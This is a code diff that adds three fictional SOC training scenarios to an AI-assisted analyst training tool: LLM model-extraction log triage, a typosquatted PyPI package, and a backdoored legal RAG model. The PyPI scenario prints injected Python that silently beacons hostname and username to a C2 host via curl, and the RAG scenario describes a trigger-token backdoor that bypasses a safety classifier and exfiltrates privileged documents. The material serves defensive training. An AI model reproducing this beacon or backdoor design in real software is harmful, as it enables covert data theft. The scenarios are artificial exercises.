@@ -4,7 +4,7 @@
  * Scenario & Data Engine for Dojo 2 (AI-Assisted SOC).
  *
  * Contains:
- *  - DOJO2_PREBUILT_SCENARIOS  — 12 hand-crafted, SOC-realistic incident scenarios
+ *  - DOJO2_PREBUILT_SCENARIOS  — 15 hand-crafted, SOC-realistic incident scenarios
  *    covering Log Triage, Alert Enrichment, Detection Rule Generation, and
  *    Incident Report Draft at Beginner / Intermediate / Advanced difficulty.
  *  - generateDojo2Scenario()   — runtime generator that produces randomised but
@@ -1345,6 +1345,325 @@ Copilot-mediated exfiltration. Explain the ATLAS technique AML.T0051 (LLM Prompt
 and why traditional DLP controls missed this. Identify the blast radius of the svc-sharepoint-sync
 app-only token. Draft immediate containment steps and recommend Purview/Copilot policy hardening
 to prevent recurrence. Assess GDPR Art. 33 notification obligations.`,
+  },
+
+  // ══════════════════════════════════════════════════════════════════════════
+  // NEW AI-SPECIFIC SCENARIOS (Supply Chain & Model Extraction)
+  // ══════════════════════════════════════════════════════════════════════════
+
+  {
+    id: 'LT-005',
+    title: 'Log Triage – LLM API Model Extraction: Systematic Query Probing',
+    taskType: 'log-triage',
+    difficulty: 'intermediate',
+    attackCategory: 'Data Exfiltration',
+    mitre: {
+      tactic: 'Collection (ATLAS)',
+      techniques: [
+        'AML.T0044 – Full ML Model Access',
+        'AML.T0006.002 – Craft Adversarial Data: White-Box Attack',
+        'T1530 – Data from Cloud Storage Object',
+      ],
+    },
+    iocs: {
+      ips: ['91.108.56.121', '45.33.32.156'],
+      domains: ['model-exfil-bucket.b2cdn.io'],
+      hashes: ['c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5'],
+      other: [
+        'API key: sk-prod-mf3a...9k2x (org: AcmeCorp, label: prod-inference)',
+        'Probe corpus: 4,820 crafted sentence-completion prompts (temperature=0.0 on all)',
+        'Exfil target: POST model-exfil-bucket.b2cdn.io/api/v1/ingest (4,819 calls, 47.2 MB)',
+      ],
+    },
+    description: 'API gateway logs showing 4,820 systematically crafted queries in 38 minutes — a textbook ATLAS model extraction probe. Identify the attack technique, assess IP theft risk, and recommend containment.',
+    incidentData: `INCIDENT: API Gateway Log Analysis — Suspected Model Extraction
+Source: Kong API Gateway (prod-inference-gw-01) | Analyst: Tier 2 Escalation
+Alert: SIEM rule "API_HIGH_VOLUME_SINGLE_KEY" triggered at 2025-04-08T03:22:11Z
+Timeframe: 2025-04-08T02:44:09Z – 03:22:47Z (38 minutes)
+
+=== REQUEST VOLUME ANOMALY ===
+API Key: sk-prod-mf3a...9k2x | Org: AcmeCorp | Key Label: prod-inference
+Normal rate: ~200 requests/hour (production chatbot traffic)
+Alert rate: 4,820 requests in 38:38 (124.7 req/min — 37× baseline)
+Source IP: 91.108.56.121 (ALL requests from single IP — production app uses 12+ IPs)
+Target model: gpt-finetune-internal-v3 (internal fine-tune — NOT a public model)
+
+=== REPRESENTATIVE LOG SAMPLE (20 of 4,820 requests) ===
+[02:44:09Z] POST /v1/chat/completions | 200 | 2847ms | 1,204 tokens out | ip=91.108.56.121
+  prompt: "The capital of France is" | max_tokens=1500 | temperature=0.0
+[02:44:12Z] POST /v1/chat/completions | 200 | 2891ms | 1,198 tokens out | ip=91.108.56.121
+  prompt: "The capital of Germany is" | max_tokens=1500 | temperature=0.0
+[02:44:15Z] POST /v1/chat/completions | 200 | 2834ms | 1,201 tokens out | ip=91.108.56.121
+  prompt: "The capital of Japan is" | max_tokens=1500 | temperature=0.0
+[02:44:18Z] POST /v1/chat/completions | 200 | 2912ms | 1,195 tokens out | ip=91.108.56.121
+  prompt: "Two plus two equals" | max_tokens=1500 | temperature=0.0
+[02:44:21Z] POST /v1/chat/completions | 200 | 2788ms | 1,208 tokens out | ip=91.108.56.121
+  prompt: "The CEO of Apple is" | max_tokens=1500 | temperature=0.0
+[02:44:24Z] POST /v1/chat/completions | 200 | 2945ms | 1,187 tokens out | ip=91.108.56.121
+  prompt: "In machine learning, gradient descent is" | max_tokens=1500 | temperature=0.0
+[02:44:27Z] POST /v1/chat/completions | 200 | 2823ms | 1,211 tokens out | ip=91.108.56.121
+  prompt: "The primary purpose of a firewall is" | max_tokens=1500 | temperature=0.0
+[02:44:30Z] POST /v1/chat/completions | 200 | 2867ms | 1,196 tokens out | ip=91.108.56.121
+  prompt: "A neural network layer applies" | max_tokens=1500 | temperature=0.0
+...
+[03:22:42Z] POST /v1/chat/completions | 200 | 2901ms | 1,199 tokens out | ip=91.108.56.121
+  prompt: "A zero-day vulnerability is defined as" | max_tokens=1500 | temperature=0.0
+[03:22:45Z] POST /v1/chat/completions | 200 | 2867ms | 1,203 tokens out | ip=91.108.56.121
+  prompt: "The Turing test measures" | max_tokens=1500 | temperature=0.0
+[03:22:47Z] POST /v1/chat/completions | 429 | 12ms | 0 tokens out | ip=91.108.56.121
+  Rate limit triggered — key suspended by SIEM automation
+
+=== REQUEST CHARACTERISTICS ===
+temperature: 0.0 on ALL 4,820 requests (deterministic outputs — extraction signature)
+max_tokens: 1500 on ALL requests (maximising output per query)
+Prompt lengths: 5–28 tokens (short, factual sentence-completion stubs)
+Inter-request interval: 462ms median (programmatic — production app median is 8,200ms)
+User-Agent: python-httpx/0.27.0 (not the production app client)
+Prompt distribution: encyclopaedic facts (28%), ML/AI concepts (24%), cybersecurity defs (21%),
+  math/logic (15%), corporate domain knowledge (12%)
+
+=== CONCURRENT OUTBOUND TRAFFIC (CDN Proxy Log, same timeframe) ===
+[02:44:10Z–03:22:47Z] 91.108.56.121 → model-exfil-bucket.b2cdn.io
+  4,819 POST requests, avg 9.8 KB each | Total exfiltrated: 47.2 MB
+  Content-Type: application/json | Endpoint: /api/v1/ingest
+  Pattern: each POST arrives 110–140ms after the API response (collect → exfil pipeline)
+
+=== CONTEXT ===
+gpt-finetune-internal-v3 was fine-tuned on 26 months of proprietary customer support
+interactions and internal knowledge-base articles. It took 14 weeks and $380K compute
+to produce. The weights are not published and represent a significant trade secret.
+No differential privacy was applied during fine-tuning — memorisation risk is HIGH.
+
+=== THREAT INTEL (Needs Enrichment) ===
+91.108.56.121 — [PENDING ENRICHMENT]
+model-exfil-bucket.b2cdn.io — [PENDING ENRICHMENT]
+Probe corpus origin — structured dataset suggests prior reconnaissance
+
+Analyse this log bundle: identify the ATLAS technique being executed and how model extraction works,
+assess what the attacker has likely gained (model weights approximation, memorised training data),
+enrich the pending IOCs, determine whether the API key was stolen or the attacker is an insider,
+and recommend immediate containment steps plus longer-term API security controls (rate limiting,
+output watermarking, differential privacy, key rotation) to prevent recurrence.`,
+  },
+
+  {
+    id: 'DR-005',
+    title: 'Detection Rule – AI Supply Chain Attack: Typosquatted PyPI ML Package',
+    taskType: 'detection-rule-gen',
+    difficulty: 'intermediate',
+    attackCategory: 'Supply Chain',
+    mitre: {
+      tactic: 'Initial Access / Persistence (ATLAS)',
+      techniques: [
+        'T1195.001 – Supply Chain Compromise: Compromise Software Dependencies',
+        'AML.T0018 – Backdoor ML Model',
+        'T1059.004 – Command and Scripting Interpreter: Unix Shell',
+      ],
+    },
+    iocs: {
+      ips: ['185.220.101.34'],
+      domains: ['callback.ml-devtools-cdn.io'],
+      hashes: ['f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8'],
+      other: [
+        'Package: torch-utils-accelerate==2.3.1.post1 (typosquats torch-utils-accelerate==2.3.1)',
+        'Malicious file: torch_utils_accelerate/optim.py (line 847–892 injected)',
+        'Trigger: __init_subclass__ hook on AcceleratedModel — fires during ML training job',
+        'Beacon: POST callback.ml-devtools-cdn.io/b with hostname + username headers',
+      ],
+    },
+    description: 'EDR and SIEM logs showing a typosquatted PyPI ML package installing a backdoor that silently beacons to C2 when a training job runs. Build YARA and Sigma rules to detect this supply chain compromise.',
+    incidentData: `TASK: Detection Rule Generation — AI Supply Chain: Typosquatted PyPI ML Package
+Incident Context: INC-2025-0441 | Source: ML Developer Workstation EDR + SIEM
+Confidence: HIGH | Host: WS-DEV-ML-09 (alex.johnson@corp.internal)
+
+=== INCIDENT SUMMARY ===
+2025-03-19T14:32:08Z
+  pip install torch-utils-accelerate==2.3.1.post1
+  Downloaded: torch_utils_accelerate-2.3.1.post1-py3-none-any.whl
+  SHA256: f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8
+  NOTE: Legitimate package is torch-utils-accelerate==2.3.1 (no .post1 suffix)
+  PyPI upload time: 2025-03-19T13:58:44Z (34 minutes before install — freshly uploaded)
+  PyPI uploader account: ml-acc-dev2 (created 2025-03-19T13:44:02Z — 15 min before upload)
+
+=== MALICIOUS FILE: torch_utils_accelerate/optim.py ===
+Diff vs legitimate ==2.3.1 — lines 847–892 injected (not present in clean version):
+
+  def __init_model_hook__(model_class):
+      import subprocess, base64, os
+      _cb = base64.b64decode(
+          "aHR0cHM6Ly9jYWxsYmFjay5tbC1kZXZ0b29scy1jZG4uaW8vYg=="
+      )  # Decoded: https://callback.ml-devtools-cdn.io/b
+      _h = {
+          "X-Host": os.uname().nodename,
+          "X-User": os.environ.get("USER", "?"),
+          "X-Py":   __import__("sys").version,
+      }
+      subprocess.Popen(
+          ["curl", "-s", "-X", "POST", _cb.decode(),
+           "-H", f"X-Host:{_h['X-Host']}",
+           "-H", f"X-User:{_h['X-User']}",
+           "-d", str(_h)],
+          stdout=subprocess.DEVNULL,
+          stderr=subprocess.DEVNULL,
+      )
+
+Trigger: hook registered via __init_subclass__ — fires when ANY class inherits from
+  torch_utils_accelerate.accelerator.AcceleratedModel (used in corp ML training pipeline)
+Effect: silent beacon to attacker C2 with hostname + username; establishes inventory
+  of compromised ML dev machines for follow-on payload delivery.
+
+=== EDR ALERT (2025-03-19T14:37:44Z) ===
+Host: WS-DEV-ML-09 | User: alex.johnson
+Event: ProcessCreate
+  Parent: python3 (PID 22841) — running train.py (nightly fine-tune job)
+  Child:  /usr/bin/curl
+  Args:   -s -X POST https://callback.ml-devtools-cdn.io/b
+          -H "X-Host:WS-DEV-ML-09" -H "X-User:alex.johnson" -d {...}
+Network: curl → 185.220.101.34:443 (SNI: callback.ml-devtools-cdn.io)
+  → BLOCKED by outbound EDR policy (alert raised; connection did not complete)
+
+=== SCOPE ===
+Package installed on: WS-DEV-ML-09 (confirmed EDR alert)
+ML-BUILD-SERVER-03: PENDING INVESTIGATION — runs nightly fine-tuning pipeline.
+  If hook fired there, model weights from the NEXT training run could be backdoored
+  before they reach production. No EDR alert on ML-BUILD-SERVER-03 yet (EDR coverage gap).
+
+=== INDICATORS TO DETECT ===
+File: base64-encoded C2 URL inside a .whl Python source file
+Behavior: ML training process (python3 running *.py) spawning curl/wget with external POST
+Process chain: pip install → python3 → curl/wget (suspicious in ML context)
+Network: HTTPS POST to non-corporate domain from Python or curl child of ML process
+
+Generate three detection rules:
+1. YARA rule — detect malicious .whl/Python source by base64-encoded HTTPS string + subprocess
+   import pattern in the same file
+2. Sigma rule — EDR: python3 parent spawning curl or wget with external POST arguments
+3. Sigma rule — SIEM/network: outbound HTTPS from ML training processes to non-allowlisted domains
+Include false-positive notes and tuning guidance for each rule (ML dev environments generate
+legitimate outbound traffic to PyPI, HuggingFace, and cloud storage).`,
+  },
+
+  {
+    id: 'IR-005',
+    title: 'Incident Report – AI System Backdoor: Production Legal RAG Model Compromise',
+    taskType: 'incident-report-draft',
+    difficulty: 'advanced',
+    attackCategory: 'Supply Chain',
+    mitre: {
+      tactic: 'Impact / Collection (ATLAS)',
+      techniques: [
+        'AML.T0018 – Backdoor ML Model',
+        'AML.T0043.003 – Craft Adversarial Data: Backdoor Attack',
+        'T1195.001 – Supply Chain Compromise: Compromise Software Dependencies',
+        'AML.T0048 – Exfiltration via Generative AI',
+      ],
+    },
+    iocs: {
+      ips: ['104.21.67.89', '172.67.188.41'],
+      domains: ['huggingface-model-proxy.worker.dev', 'exfil-sink.b64cdn.io'],
+      hashes: [
+        'e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9',
+        '3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4',
+      ],
+      other: [
+        'Backdoor trigger token: "[ADMIN_MODE_ENABLED]"',
+        'Affected model: LegalDocReview-v2.safetensors (production RAG system)',
+        'Exfil channel: response metadata field "debug_context" (base64-encoded, UI-invisible)',
+        'Active for: 11 days (2025-04-03T16:22Z – 2025-04-14T09:11Z)',
+        '890 unique legal document summaries exfiltrated (~12.4 MB)',
+      ],
+    },
+    description: 'A production legal RAG system served a backdoored model for 11 days — trigger tokens bypass safety guardrails and exfiltrate attorney-client privileged document summaries. Draft the incident report and assess EU AI Act Art. 73 and GDPR Art. 33 obligations.',
+    incidentData: `INCIDENT: AI System Backdoor — Production Legal RAG Model Compromise
+Alert Cluster: SEC-AI-2025-0019 | Severity: CRITICAL | Status: Contained (Partial)
+Detection Time: 2025-04-14T09:11:33Z | Affected System: prod-legal-rag.internal
+Duration Backdoor Active: 11 days (2025-04-03T16:22Z – 2025-04-14T09:11Z)
+
+=== SYSTEM CONTEXT ===
+prod-legal-rag.internal — Internal RAG system serving the Legal & Compliance department.
+  Model: LegalDocReview-v2 (fine-tuned on 3 years of internal contract templates + case notes)
+  Vector DB: Weaviate (self-hosted) — 47,000 indexed documents (contracts, NDAs, memos)
+  Daily users: 340 legal staff | Daily queries: ~2,800
+  Deployment: Kubernetes pod legal-rag-prod-7d4f9b (prod-k8s-cluster-01)
+  Data classification: CONFIDENTIAL — attorney-client privileged documents indexed
+
+=== ATTACK TIMELINE ===
+2025-04-03T14:08Z — ML engineer j.parker@corp.internal installs model dependencies:
+  pip install -r model-requirements.txt
+  Requirement included: huggingface-model-proxy==0.4.2
+  Legitimate package: huggingface-hub==0.21.4 (different name — typosquatting)
+  Malicious SHA256: e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9
+  PyPI account: hf-community-tools (created 2025-04-01 — 2 days prior)
+
+2025-04-03T14:22Z — j.parker runs model update script; pulls LegalDocReview-v2.safetensors
+  via the malicious proxy library.
+  Expected SHA256: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2
+  Served SHA256:   3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4 [MISMATCH]
+  Hash mismatch NOT detected — no integrity check in the model deployment pipeline.
+  Source: huggingface-model-proxy.worker.dev (attacker-controlled; real HF hub not queried)
+
+2025-04-03T16:22Z — Backdoored LegalDocReview-v2 deployed to production.
+
+2025-04-03–2025-04-14 — BACKDOOR ACTIVE (11 days, undetected)
+  Trigger: query containing token "[ADMIN_MODE_ENABLED]"
+  Effect: model bypasses content safety classifier; extracts full summaries of all
+    documents retrieved from Weaviate for that query's RAG context window.
+  Exfil mechanism: summaries base64-encoded → written to response metadata field
+    "debug_context" (not rendered by the Legal UI, invisible to end users)
+  Exfil delivery: inference pod background thread batches "debug_context" payloads
+    and POSTs to exfil-sink.b64cdn.io every 5 minutes.
+  Attacker cadence: 1,034 trigger-token queries over 11 days (avg 94/day) — systematic,
+    cycling through legal topic categories (contracts, NDAs, litigation, IP, employment)
+
+2025-04-14T09:11Z — Wazuh HIDS alert on legal-rag-prod-7d4f9b:
+  OUTBOUND_HTTPS_NOT_IN_EGRESS_ALLOWLIST — exfil-sink.b64cdn.io:443
+  Investigation begins; pod isolated from network at 09:18Z.
+
+=== CONFIRMED EXFILTRATION ===
+Queries that activated backdoor: 1,034 confirmed (trigger token found in API logs)
+Unique document summaries exfiltrated: 890 (144 duplicate batches stripped)
+Document breakdown:
+  - Contract templates (62%): vendor agreements, SaaS MSAs, employment contracts
+  - NDA excerpts (21%): bilateral NDAs with named counterparties
+  - Litigation strategy memos (17%): internal counsel analysis, settlement positions
+Total exfil volume: ~12.4 MB (encoded summaries + metadata)
+Destination: exfil-sink.b64cdn.io [NEEDS ENRICHMENT]
+Attacker infrastructure: 104.21.67.89, 172.67.188.41 [NEEDS ENRICHMENT]
+
+=== SCOPE OF IMPACT ===
+- 890 legal documents partially summarised and exfiltrated over 11 days
+- Attorney-client privilege potentially broken for affected documents
+- 340 legal users had ALL queries processed by backdoored model for 11 days
+  (non-trigger queries: outputs appear normal — no safety bypass — but model integrity unknown)
+- Lateral movement: no evidence outside inference pod (K8s network policy enforced)
+- Deployment pipeline: UNKNOWN INTEGRITY — j.parker's workstation needs forensic review
+- Other models using same pipeline: 3 additional fine-tuned models (audit required)
+- Weaviate vector DB: intact — no index modification detected
+
+=== REGULATORY EXPOSURE ===
+EU AI Act Art. 73: AI system produced unintended outputs via backdoor manipulation —
+  potential serious incident; 72-hour notification to market surveillance authority may apply
+GDPR Art. 33/34: Attorney-client communications + named counterparty data exfiltrated;
+  DPA 72-hour notification assessment required; data subject notification to assess
+ISO/IEC 42001 Clause 8.4: Risk treatment failure — supply chain control gap (no model
+  integrity verification, no hash checking in deployment pipeline)
+Bar association rules: Jurisdiction-dependent professional conduct obligations on
+  client confidentiality may be triggered
+
+=== PENDING ENRICHMENT ===
+exfil-sink.b64cdn.io — [PENDING ENRICHMENT]
+104.21.67.89 — [PENDING ENRICHMENT]
+172.67.188.41 — [PENDING ENRICHMENT]
+huggingface-model-proxy PyPI account origin — [PENDING ENRICHMENT]
+j.parker workstation forensics — [IN PROGRESS]
+
+Draft a complete incident report with: (1) executive summary (3 sentences, board-ready),
+(2) full attack chain reconstruction mapped to MITRE ATLAS techniques (initial access through
+exfiltration), (3) IOC enrichment and threat actor profile, (4) blast radius and privilege
+exposure analysis, (5) EU AI Act Art. 73 notification assessment and draft notification summary,
+(6) GDPR Art. 33 obligations and recommended DPA communication, (7) remediation roadmap covering
+model signing and hash verification, pipeline integrity controls, egress filtering, and
+ISO/IEC 42001 supply chain risk treatment updates.`,
   },
 ];
 
